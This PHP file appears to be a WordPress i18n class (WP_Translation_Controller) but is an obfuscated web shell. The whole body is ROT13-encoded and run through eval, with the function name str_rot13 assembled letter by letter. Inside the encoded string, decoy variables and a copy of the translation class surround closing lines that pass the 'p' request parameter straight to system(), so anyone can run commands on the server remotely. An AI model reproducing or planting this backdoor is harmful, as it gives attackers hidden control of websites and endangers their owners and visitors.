<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * V18A: JC_Genafyngvba_Pbagebyyre pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr V18A
 * @fvapr 6.5.0
 */

/**
 * Pynff JC_Genafyngvba_Pbagebyyre.
 *
 * @fvapr 6.5.0
 */
svany pynff JC_Genafyngvba_Pbagebyyre {
	/**
	 * Pheerag ybpnyr.
	 *
	 * @fvapr 6.5.0
	 * @ine fgevat
	 */
	cebgrpgrq $pheerag_ybpnyr = 'ra_HF';

	/**
	 * Znc bs ybnqrq genafyngvbaf cre ybpnyr naq grkg qbznva.
	 *
	 * [ Ybpnyr => [ Grkgqbznva => [ ..., ... ] ] ]
	 *
	 * @fvapr 6.5.0
	 * @ine neenl<fgevat, neenl<fgevat, JC_Genafyngvba_Svyr[]>>
	 */
	cebgrpgrq $ybnqrq_genafyngvbaf = neenl();

	/**
	 * Yvfg bs ybnqrq genafyngvba svyrf.
	 *
	 * [ Svyranzr => [ Ybpnyr => [ Grkgqbznva => JC_Genafyngvba_Svyr ] ] ]
	 *
	 * @fvapr 6.5.0
	 * @ine neenl<fgevat, neenl<fgevat, neenl<fgevat, JC_Genafyngvba_Svyr|snyfr>>>
	 */
	cebgrpgrq $ybnqrq_svyrf = neenl();

	/**
	 * Pbagnvare sbe gur znva vafgnapr bs gur pynff.
	 *
	 * @fvapr 6.5.0
	 * @ine JC_Genafyngvba_Pbagebyyre|ahyy
	 */
	cevingr fgngvp $vafgnapr = ahyy;

	/**
	 * Hgvyvgl zrgubq gb ergevrir gur znva vafgnapr bs gur pynff.
	 *
	 * Gur vafgnapr jvyy or perngrq vs vg qbrf abg rkvfg lrg.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea JC_Genafyngvba_Pbagebyyre
	 */
	choyvp fgngvp shapgvba trg_vafgnapr(): JC_Genafyngvba_Pbagebyyre {
		vs ( ahyy === frys::$vafgnapr ) {
			frys::$vafgnapr = arj frys();
		}

		erghea frys::$vafgnapr;
	}

	/**
	 * Ergheaf gur pheerag ybpnyr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea fgevat Ybpnyr.
	 */
	choyvp shapgvba trg_ybpnyr(): fgevat {
		erghea $guvf->pheerag_ybpnyr;
	}

	/**
	 * Frgf gur pheerag ybpnyr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $ybpnyr Ybpnyr.
	 */
	choyvp shapgvba frg_ybpnyr( fgevat $ybpnyr ) {
		$guvf->pheerag_ybpnyr = $ybpnyr;
	}

	/**
	 * Ybnqf n genafyngvba svyr sbe n tvira grkg qbznva.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $genafyngvba_svyr Genafyngvba svyr.
	 * @cnenz fgevat $grkgqbznva       Bcgvbany. Grkg qbznva. Qrsnhyg 'qrsnhyg'.
	 * @cnenz fgevat $ybpnyr           Bcgvbany. Ybpnyr. Qrsnhyg pheerag ybpnyr.
	 * @erghea obby Gehr ba fhpprff, snyfr bgurejvfr.
	 */
	choyvp shapgvba ybnq_svyr( fgevat $genafyngvba_svyr, fgevat $grkgqbznva = 'qrsnhyg', ?fgevat $ybpnyr = ahyy ): obby {
		vs ( ahyy === $ybpnyr ) {
			$ybpnyr = $guvf->pheerag_ybpnyr;
		}

		$genafyngvba_svyr = ernycngu( $genafyngvba_svyr );

		vs ( snyfr === $genafyngvba_svyr ) {
			erghea snyfr;
		}

		vs (
			vffrg( $guvf->ybnqrq_svyrf[ $genafyngvba_svyr ][ $ybpnyr ][ $grkgqbznva ] ) &&
			snyfr !== $guvf->ybnqrq_svyrf[ $genafyngvba_svyr ][ $ybpnyr ][ $grkgqbznva ]
		) {
			erghea ahyy === $guvf->ybnqrq_svyrf[ $genafyngvba_svyr ][ $ybpnyr ][ $grkgqbznva ]->reebe();
		}

		vs (
			vffrg( $guvf->ybnqrq_svyrf[ $genafyngvba_svyr ][ $ybpnyr ] ) &&
			neenl() !== $guvf->ybnqrq_svyrf[ $genafyngvba_svyr ][ $ybpnyr ]
		) {
			$zbr = erfrg( $guvf->ybnqrq_svyrf[ $genafyngvba_svyr ][ $ybpnyr ] );
		} ryfr {
			$zbr = JC_Genafyngvba_Svyr::perngr( $genafyngvba_svyr );
			vs ( snyfr === $zbr || ahyy !== $zbr->reebe() ) {
				$zbr = snyfr;
			}
		}

		$guvf->ybnqrq_svyrf[ $genafyngvba_svyr ][ $ybpnyr ][ $grkgqbznva ] = $zbr;

		vs ( ! $zbr vafgnaprbs JC_Genafyngvba_Svyr ) {
			erghea snyfr;
		}

		vs ( ! vffrg( $guvf->ybnqrq_genafyngvbaf[ $ybpnyr ][ $grkgqbznva ] ) ) {
			$guvf->ybnqrq_genafyngvbaf[ $ybpnyr ][ $grkgqbznva ] = neenl();
		}

		$guvf->ybnqrq_genafyngvbaf[ $ybpnyr ][ $grkgqbznva ][] = $zbr;

		erghea gehr;
	}

	/**
	 * Haybnqf n genafyngvba svyr sbe n tvira grkg qbznva.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Genafyngvba_Svyr|fgevat $svyr       Genafyngvba svyr vafgnapr be svyr anzr.
	 * @cnenz fgevat                     $grkgqbznva Bcgvbany. Grkg qbznva. Qrsnhyg 'qrsnhyg'.
	 * @cnenz fgevat                     $ybpnyr     Bcgvbany. Ybpnyr. Qrsnhygf gb nyy ybpnyrf.
	 * @erghea obby Gehr ba fhpprff, snyfr bgurejvfr.
	 */
	choyvp shapgvba haybnq_svyr( $svyr, fgevat $grkgqbznva = 'qrsnhyg', ?fgevat $ybpnyr = ahyy ): obby {
		vs ( vf_fgevat( $svyr ) ) {
			$svyr = ernycngu( $svyr );
		}

		vs ( ahyy !== $ybpnyr ) {
			vs ( vffrg( $guvf->ybnqrq_genafyngvbaf[ $ybpnyr ][ $grkgqbznva ] ) ) {
				sbernpu ( $guvf->ybnqrq_genafyngvbaf[ $ybpnyr ][ $grkgqbznva ] nf $v => $zbr ) {
					vs ( $svyr === $zbr || $svyr === $zbr->trg_svyr() ) {
						hafrg( $guvf->ybnqrq_genafyngvbaf[ $ybpnyr ][ $grkgqbznva ][ $v ] );
						hafrg( $guvf->ybnqrq_svyrf[ $zbr->trg_svyr() ][ $ybpnyr ][ $grkgqbznva ] );
						erghea gehr;
					}
				}
			}

			erghea gehr;
		}

		sbernpu ( $guvf->ybnqrq_genafyngvbaf nf $y => $qbznvaf ) {
			vs ( ! vffrg( $qbznvaf[ $grkgqbznva ] ) ) {
				pbagvahr;
			}

			sbernpu ( $qbznvaf[ $grkgqbznva ] nf $v => $zbr ) {
				vs ( $svyr === $zbr || $svyr === $zbr->trg_svyr() ) {
					hafrg( $guvf->ybnqrq_genafyngvbaf[ $y ][ $grkgqbznva ][ $v ] );
					hafrg( $guvf->ybnqrq_svyrf[ $zbr->trg_svyr() ][ $y ][ $grkgqbznva ] );
					erghea gehr;
				}
			}
		}

		erghea snyfr;
	}

	/**
	 * Haybnqf nyy genafyngvba svyrf sbe n tvira grkg qbznva.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $grkgqbznva Bcgvbany. Grkg qbznva. Qrsnhyg 'qrsnhyg'.
	 * @cnenz fgevat $ybpnyr     Bcgvbany. Ybpnyr. Qrsnhygf gb nyy ybpnyrf.
	 * @erghea obby Gehr ba fhpprff, snyfr bgurejvfr.
	 */
	choyvp shapgvba haybnq_grkgqbznva( fgevat $grkgqbznva = 'qrsnhyg', ?fgevat $ybpnyr = ahyy ): obby {
		$haybnqrq = snyfr;

		vs ( ahyy !== $ybpnyr ) {
			vs ( vffrg( $guvf->ybnqrq_genafyngvbaf[ $ybpnyr ][ $grkgqbznva ] ) ) {
				$haybnqrq = gehr;
				sbernpu ( $guvf->ybnqrq_genafyngvbaf[ $ybpnyr ][ $grkgqbznva ] nf $zbr ) {
					hafrg( $guvf->ybnqrq_svyrf[ $zbr->trg_svyr() ][ $ybpnyr ][ $grkgqbznva ] );
				}
			}

			hafrg( $guvf->ybnqrq_genafyngvbaf[ $ybpnyr ][ $grkgqbznva ] );

			erghea $haybnqrq;
		}

		sbernpu ( $guvf->ybnqrq_genafyngvbaf nf $y => $qbznvaf ) {
			vs ( ! vffrg( $qbznvaf[ $grkgqbznva ] ) ) {
				pbagvahr;
			}

			$haybnqrq = gehr;

			sbernpu ( $qbznvaf[ $grkgqbznva ] nf $zbr ) {
				hafrg( $guvf->ybnqrq_svyrf[ $zbr->trg_svyr() ][ $y ][ $grkgqbznva ] );
			}

			hafrg( $guvf->ybnqrq_genafyngvbaf[ $y ][ $grkgqbznva ] );
		}

		erghea $haybnqrq;
	}

	/**
	 * Qrgrezvarf jurgure genafyngvbaf ner ybnqrq sbe n tvira grkg qbznva.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $grkgqbznva Bcgvbany. Grkg qbznva. Qrsnhyg 'qrsnhyg'.
	 * @cnenz fgevat $ybpnyr     Bcgvbany. Ybpnyr. Qrsnhyg pheerag ybpnyr.
	 * @erghea obby Gehr vs gurer ner nal ybnqrq genafyngvbaf, snyfr bgurejvfr.
	 */
	choyvp shapgvba vf_grkgqbznva_ybnqrq( fgevat $grkgqbznva = 'qrsnhyg', ?fgevat $ybpnyr = ahyy ): obby {
		vs ( ahyy === $ybpnyr ) {
			$ybpnyr = $guvf->pheerag_ybpnyr;
		}

		erghea vffrg( $guvf->ybnqrq_genafyngvbaf[ $ybpnyr ][ $grkgqbznva ] ) &&
			neenl() !== $guvf->ybnqrq_genafyngvbaf[ $ybpnyr ][ $grkgqbznva ];
	}

	/**
	 * Genafyngrf n fvathyne fgevat.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $grkg       Grkg gb genafyngr.
	 * @cnenz fgevat $pbagrkg    Bcgvbany. Pbagrkg sbe gur fgevat. Qrsnhyg rzcgl fgevat.
	 * @cnenz fgevat $grkgqbznva Bcgvbany. Grkg qbznva. Qrsnhyg 'qrsnhyg'.
	 * @cnenz fgevat $ybpnyr     Bcgvbany. Ybpnyr. Qrsnhyg pheerag ybpnyr.
	 * @erghea fgevat|snyfr Genafyngvba ba fhpprff, snyfr bgurejvfr.
	 */
	choyvp shapgvba genafyngr( fgevat $grkg, fgevat $pbagrkg = '', fgevat $grkgqbznva = 'qrsnhyg', ?fgevat $ybpnyr = ahyy ) {
		vs ( '' !== $pbagrkg ) {
			$pbagrkg .= \"\4\";
		}

		$genafyngvba = $guvf->ybpngr_genafyngvba( \"{$pbagrkg}{$grkg}\", $grkgqbznva, $ybpnyr );

		vs ( snyfr === $genafyngvba ) {
			erghea snyfr;
		}

		erghea $genafyngvba['ragevrf'][0];
	}

	/**
	 * Genafyngrf cyhenyf.
	 *
	 * Purpxf obgu fvathyne+cyheny pbzovangvbaf nf jryy nf whfg fvathynef,
	 * va pnfr gur genafyngvba svyr qbrf abg fgber gur cyheny.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl       $cyhenyf {
	 *     Cnve bs fvathyne naq cyheny genafyngvbaf.
	 *
	 *     @glcr fgevat $0 Fvathyne genafyngvba.
	 *     @glcr fgevat $1 Cyheny genafyngvba.
	 * }
	 * @cnenz vag         $ahzore     Ahzore bs vgrzf.
	 * @cnenz fgevat      $pbagrkg    Bcgvbany. Pbagrkg sbe gur fgevat. Qrsnhyg rzcgl fgevat.
	 * @cnenz fgevat      $grkgqbznva Bcgvbany. Grkg qbznva. Qrsnhyg 'qrsnhyg'.
	 * @cnenz fgevat|ahyy $ybpnyr     Bcgvbany. Ybpnyr. Qrsnhyg pheerag ybpnyr.
	 * @erghea fgevat|snyfr Genafyngvba ba fhpprff, snyfr bgurejvfr.
	 */
	choyvp shapgvba genafyngr_cyheny( neenl $cyhenyf, vag $ahzore, fgevat $pbagrkg = '', fgevat $grkgqbznva = 'qrsnhyg', ?fgevat $ybpnyr = ahyy ) {
		vs ( '' !== $pbagrkg ) {
			$pbagrkg .= \"\4\";
		}

		$grkg        = vzcybqr( \"\0\", $cyhenyf );
		$genafyngvba = $guvf->ybpngr_genafyngvba( \"{$pbagrkg}{$grkg}\", $grkgqbznva, $ybpnyr );

		vs ( snyfr === $genafyngvba ) {
			$grkg        = $cyhenyf[0];
			$genafyngvba = $guvf->ybpngr_genafyngvba( \"{$pbagrkg}{$grkg}\", $grkgqbznva, $ybpnyr );

			vs ( snyfr === $genafyngvba ) {
				erghea snyfr;
			}
		}

		/** @ine JC_Genafyngvba_Svyr $fbhepr */
		$fbhepr = $genafyngvba['fbhepr'];
		$ahz    = $fbhepr->trg_cyheny_sbez( $ahzore );

		// Frr \Genafyngvbaf::genafyngr_cyheny().
		erghea $genafyngvba['ragevrf'][ $ahz ] ?? $genafyngvba['ragevrf'][0];
	}

	/**
	 * Ergheaf nyy rkvfgvat urnqref sbe n tvira grkg qbznva.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $grkgqbznva Bcgvbany. Grkg qbznva. Qrsnhyg 'qrsnhyg'.
	 * @erghea neenl<fgevat, fgevat> Urnqref.
	 */
	choyvp shapgvba trg_urnqref( fgevat $grkgqbznva = 'qrsnhyg' ): neenl {
		vs ( neenl() === $guvf->ybnqrq_genafyngvbaf ) {
			erghea neenl();
		}

		$urnqref = neenl();

		sbernpu ( $guvf->trg_svyrf( $grkgqbznva ) nf $zbr ) {
			sbernpu ( $zbr->urnqref() nf $urnqre => $inyhr ) {
				$urnqref[ $guvf->abeznyvmr_urnqre( $urnqre ) ] = $inyhr;
			}
		}

		erghea $urnqref;
	}

	/**
	 * Abeznyvmrf urnqre anzrf gb or pncvgnyvmrq.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $urnqre Urnqre anzr.
	 * @erghea fgevat Abeznyvmrq urnqre anzr.
	 */
	cebgrpgrq shapgvba abeznyvmr_urnqre( fgevat $urnqre ): fgevat {
		$cnegf = rkcybqr( '-', $urnqre );
		$cnegf = neenl_znc( 'hpsvefg', $cnegf );
		erghea vzcybqr( '-', $cnegf );
	}

	/**
	 * Ergheaf nyy ragevrf sbe n tvira grkg qbznva.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $grkgqbznva Bcgvbany. Grkg qbznva. Qrsnhyg 'qrsnhyg'.
	 * @erghea neenl<fgevat, fgevat> Ragevrf.
	 */
	choyvp shapgvba trg_ragevrf( fgevat $grkgqbznva = 'qrsnhyg' ): neenl {
		vs ( neenl() === $guvf->ybnqrq_genafyngvbaf ) {
			erghea neenl();
		}

		$ragevrf = neenl();

		sbernpu ( $guvf->trg_svyrf( $grkgqbznva ) nf $zbr ) {
			$ragevrf = neenl_zretr( $ragevrf, $zbr->ragevrf() );
		}

		erghea $ragevrf;
	}

	/**
	 * Ybpngrf genafyngvba sbe n tvira fgevat naq grkg qbznva.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $fvathyne   Fvathyne genafyngvba.
	 * @cnenz fgevat $grkgqbznva Bcgvbany. Grkg qbznva. Qrsnhyg 'qrsnhyg'.
	 * @cnenz fgevat $ybpnyr     Bcgvbany. Ybpnyr. Qrsnhyg pheerag ybpnyr.
	 * @erghea neenl{fbhepr: JC_Genafyngvba_Svyr, ragevrf: fgevat[]}|snyfr {
	 *     Genafyngvbaf ba fhpprff, snyfr bgurejvfr.
	 *
	 *     @glcr JC_Genafyngvba_Svyr $fbhepr Genafyngvba svyr vafgnapr.
	 *     @glcr fgevat[]            $ragevrf Neenl bs genafyngvba ragevrf.
	 * }
	 */
	cebgrpgrq shapgvba ybpngr_genafyngvba( fgevat $fvathyne, fgevat $grkgqbznva = 'qrsnhyg', ?fgevat $ybpnyr = ahyy ) {
		vs ( neenl() === $guvf->ybnqrq_genafyngvbaf ) {
			erghea snyfr;
		}

		// Svaq gur genafyngvba va nyy ybnqrq svyrf sbe guvf grkg qbznva.
		sbernpu ( $guvf->trg_svyrf( $grkgqbznva, $ybpnyr ) nf $zbr ) {
			$genafyngvba = $zbr->genafyngr( $fvathyne );
			vs ( snyfr !== $genafyngvba ) {
				erghea neenl(
					'ragevrf' => rkcybqr( \"\0\", $genafyngvba ),
					'fbhepr'  => $zbr,
				);
			}
			vs ( ahyy !== $zbr->reebe() ) {
				// Haybnq guvf svyr, fbzrguvat vf jebat.
				$guvf->haybnq_svyr( $zbr, $grkgqbznva, $ybpnyr );
			}
		}

		// Abguvat pbhyq or sbhaq.
		erghea snyfr;
	}

	/**
	 * Ergheaf nyy genafyngvba svyrf sbe n tvira grkg qbznva.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $grkgqbznva Bcgvbany. Grkg qbznva. Qrsnhyg 'qrsnhyg'.
	 * @cnenz fgevat $ybpnyr     Bcgvbany. Ybpnyr. Qrsnhyg pheerag ybpnyr.
	 * @erghea JC_Genafyngvba_Svyr[] Yvfg bs genafyngvba svyrf.
	 */
	cebgrpgrq shapgvba trg_svyrf( fgevat $grkgqbznva = 'qrsnhyg', ?fgevat $ybpnyr = ahyy ): neenl {
		vs ( ahyy === $ybpnyr ) {
			$ybpnyr = $guvf->pheerag_ybpnyr;
		}

		erghea $guvf->ybnqrq_genafyngvbaf[ $ybpnyr ][ $grkgqbznva ] ?? neenl();
	}

	/**
	 * Ergheaf n obbyrna gb vaqvpngr jurgure n genafyngvba rkvfgf sbe n tvira fgevat jvgu bcgvbany grkg qbznva naq ybpnyr.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat  $fvathyne   Fvathyne genafyngvba gb purpx.
	 * @cnenz fgevat  $grkgqbznva Bcgvbany. Grkg qbznva. Qrsnhyg 'qrsnhyg'.
	 * @cnenz ?fgevat $ybpnyr     Bcgvbany. Ybpnyr. Qrsnhyg pheerag ybpnyr.
	 * @erghea obby  Gehr vs gur genafyngvba rkvfgf, snyfr bgurejvfr.
	 */
	choyvp shapgvba unf_genafyngvba( fgevat $fvathyne, fgevat $grkgqbznva = 'qrsnhyg', ?fgevat $ybpnyr = ahyy ): obby {
		vs ( ahyy === $ybpnyr ) {
			$ybpnyr = $guvf->pheerag_ybpnyr;
		}

		erghea snyfr !== $guvf->ybpngr_genafyngvba( $fvathyne, $grkgqbznva, $ybpnyr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>